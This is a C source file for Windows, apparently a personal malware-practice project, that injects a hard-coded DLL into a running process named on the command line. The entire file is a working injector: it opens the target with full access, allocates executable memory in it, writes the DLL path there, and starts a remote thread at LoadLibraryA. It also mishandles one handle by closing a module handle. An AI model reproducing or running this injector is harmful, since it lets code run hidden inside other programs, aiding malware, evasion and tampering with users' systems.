#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <string.h>

void HandleError(char *message, DWORD errorCode, HANDLE hTargetProcess, HANDLE hModule, LPVOID pAllocatedMemory, HANDLE hThread)
{
    if (message)
    {
        printf("ERROR: %s: %d\n", message, errorCode);
    }
    if (pAllocatedMemory)
    {
        VirtualFreeEx(hTargetProcess, pAllocatedMemory, 0, MEM_RELEASE);
    }
    if (hThread)
    {
        CloseHandle(hThread);
    }
    if (hModule)
    {
        CloseHandle(hModule);
    }
    if (hTargetProcess)
    {
        CloseHandle(hTargetProcess);
    }
}

int main(int argc, char **argv)
{
    // ------------------ ARGV ------------------
    if (argc < 2)
    {
        printf("ERROR: Usage: \"%s\" \"program.exe\"", argv[0]);
        return 1;
    }

    // ------------------ VARIABLES ------------------
    char DllName[] = "C:\\Users\\Gieniek758\\Desktop\\malsoftware\\dll-injection\\custom-dll.dll";
    size_t DllPathSize = sizeof(DllName);
    HANDLE hTargetProcess = NULL;
    HANDLE hSnapshot = NULL;
    HMODULE hModule = NULL;
    HANDLE hCreatedThread = NULL;
    LPVOID pAllocatedMemory = NULL;
    PROCESSENTRY32 pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // ------------------ PROCESS SEARCHING ------------------
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    Process32First(hSnapshot, &pe32);
    do
    {
        if (strcmp(pe32.szExeFile, argv[1]) == 0)
        {
            hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    if (hTargetProcess == NULL)
    {
        HandleError("Failed to retrieve target process handle", GetLastError(), NULL, NULL, NULL, NULL);
        return 1;
    }
    printf("SUCCESS: Target process handle retrieved\n");

    // ------------------ ALLOCATE MEMORY ------------------
    pAllocatedMemory = VirtualAllocEx(hTargetProcess, NULL, DllPathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (pAllocatedMemory == NULL)
    {
        HandleError("Failed to allocate memory", GetLastError(), hTargetProcess, NULL, NULL, NULL);
        return 1;
    }
    printf("SUCCESS: Memory allocated at address: 0x%p\n", pAllocatedMemory);

    // ------------------ WRITE ALLOCATED MEMORY ------------------
    WriteProcessMemory(hTargetProcess, pAllocatedMemory, DllName, DllPathSize, NULL);
    printf("SUCCESS: Memory written\n");

    // ------------------ GET KERNEL32 HMODULE ------------------
    hModule = GetModuleHandleA("Kernel32");
    if (hModule == NULL)
    {
        HandleError("Failed to retrieve module handle", GetLastError(), hTargetProcess, NULL, pAllocatedMemory, NULL);
        return 1;
    }

    // ------------------ GET LOADLIBRARYA ADDRESS ------------------
    LPTHREAD_START_ROUTINE loadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, "LoadLibraryA");
    if (loadLibraryAddress == NULL)
    {
        HandleError("Failed to find load library address", GetLastError(), hTargetProcess, hModule, pAllocatedMemory, NULL);
        return 1;
    }

    // ------------------ CREATE THREAD TO EXECUTE SHELLCODE ------------------
    hCreatedThread = CreateRemoteThreadEx(hTargetProcess, NULL, 0, loadLibraryAddress, pAllocatedMemory, 0, 0, NULL);
    if (hCreatedThread == NULL)
    {
        HandleError("Failed to create thread", GetLastError(), hTargetProcess, hModule, pAllocatedMemory, NULL);
        return 1;
    }
    printf("SUCCESS: Thread created\n");

    // ------------------ CLEANUP ------------------
    WaitForSingleObject(hCreatedThread, INFINITE);
    VirtualFreeEx(hTargetProcess, pAllocatedMemory, 0, MEM_RELEASE);
    CloseHandle(hModule);
    CloseHandle(hCreatedThread);
    CloseHandle(hTargetProcess);
    printf("CLEANUP - FINISHING\n");
    return 0;
}